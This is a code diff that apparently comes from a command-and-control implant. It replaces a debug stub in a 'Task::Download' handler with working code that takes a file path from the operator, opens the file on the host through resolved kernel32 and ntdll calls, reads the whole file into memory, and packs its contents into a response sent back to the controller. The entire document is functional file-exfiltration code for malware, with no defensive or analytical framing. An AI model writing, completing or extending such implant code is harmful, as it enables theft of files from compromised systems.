@@ -147,14 +147,115 @@ auto DECLFN Task::Download(
     
     KhDbg("Download task started");
     
-    // DEBUG: Send immediate test response to verify function is called
-    Self->Pkg->Int32(Package, 1);            // chunk number
-    Self->Pkg->Str(Package, "test.txt");     // file ID
-    Self->Pkg->Str(Package, "C:\\test.txt"); // file path  
-    Self->Pkg->Int32(Package, 5);            // data size
-    Self->Pkg->Bytes(Package, (BYTE*)"hello", 5); // test data
+    // Get file path from parameters
+    PCHAR FilePath = Self->Psr->Str(Parser, 0);
+    if (!FilePath) {
+        CHAR* ErrorMsg = "No file path provided";
+        KhDbg("%s", ErrorMsg);
+        Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+        return KhRetSuccess;
+    }
     
-    KhDbg("Download test response sent");
+    KhDbg("Download file: %s", FilePath);
+    
+    // Open file for reading
+    HANDLE FileHandle = Self->Krnl32.CreateFileA(
+        FilePath, 
+        GENERIC_READ, 
+        FILE_SHARE_READ, 
+        0, 
+        OPEN_EXISTING, 
+        FILE_ATTRIBUTE_NORMAL, 
+        0
+    );
+    
+    if (FileHandle == INVALID_HANDLE_VALUE) {
+        CHAR* ErrorMsg = "Failed to open file for download";
+        KhDbg("%s: %s (Error: %d)", ErrorMsg, FilePath, KhGetError);
+        Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+        return KhRetSuccess;
+    }
+    
+    // Get file size
+    ULONG FileSize = Self->Krnl32.GetFileSize(FileHandle, 0);
+    if (FileSize == INVALID_FILE_SIZE) {
+        CHAR* ErrorMsg = "Failed to get file size";
+        KhDbg("%s: %s", ErrorMsg, FilePath);
+        Self->Ntdll.NtClose(FileHandle);
+        Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+        return KhRetSuccess;
+    }
+    
+    KhDbg("File size: %d bytes", FileSize);
+    
+    // Extract filename from path for file ID
+    PCHAR FileName = FilePath;
+    PCHAR LastSlash = nullptr;
+    for (PCHAR p = FilePath; *p; p++) {
+        if (*p == '\\' || *p == '/') {
+            LastSlash = p + 1;
+        }
+    }
+    if (LastSlash) FileName = LastSlash;
+    
+    // Allocate buffer for entire file
+    BYTE* FileBuffer = (BYTE*)hAlloc(FileSize);
+    if (!FileBuffer && FileSize > 0) {
+        CHAR* ErrorMsg = "Failed to allocate file buffer";
+        KhDbg("%s", ErrorMsg);
+        Self->Ntdll.NtClose(FileHandle);
+        Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+        return KhRetSuccess;
+    }
+    
+    // Read entire file
+    ULONG BytesRead = 0;
+    BOOL ReadResult = TRUE;
+    if (FileSize > 0) {
+        ReadResult = Self->Krnl32.ReadFile(
+            FileHandle,
+            FileBuffer,
+            FileSize,
+            &BytesRead,
+            0
+        );
+    }
+    
+    Self->Ntdll.NtClose(FileHandle);
+    
+    if (!ReadResult || BytesRead != FileSize) {
+        CHAR* ErrorMsg = "Failed to read file";
+        KhDbg("%s: %s", ErrorMsg, FilePath);
+        if (FileBuffer) hFree(FileBuffer);
+        Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+        return KhRetSuccess;
+    }
+    
+    // Create simple file ID using just the filename
+    CHAR FileID[64];
+    PCHAR FileIdPtr = FileID;
+    PCHAR src = FileName;
+    INT nameLen = 0;
+    while (*src && nameLen < 50) {
+        *FileIdPtr++ = *src++;
+        nameLen++;
+    }
+    *FileIdPtr = '\0';
+    
+    // Send response in expected format:
+    // current_chunk (Int32), file_id (String), file_path (String), chunk_size (Int32), file_data (bytes)
+    Self->Pkg->Int32(Package, 1);            // chunk number (always 1 for complete file)
+    Self->Pkg->Str(Package, FileID);         // file identifier
+    Self->Pkg->Str(Package, FilePath);       // full file path
+    Self->Pkg->Int32(Package, FileSize);     // data size
+    
+    // Send file data
+    if (FileSize > 0) {
+        Self->Pkg->Bytes(Package, FileBuffer, FileSize);
+        hFree(FileBuffer);
+    }
+    
+    KhDbg("Download completed successfully: %d bytes", FileSize);
     return KhRetSuccess;
 }
 
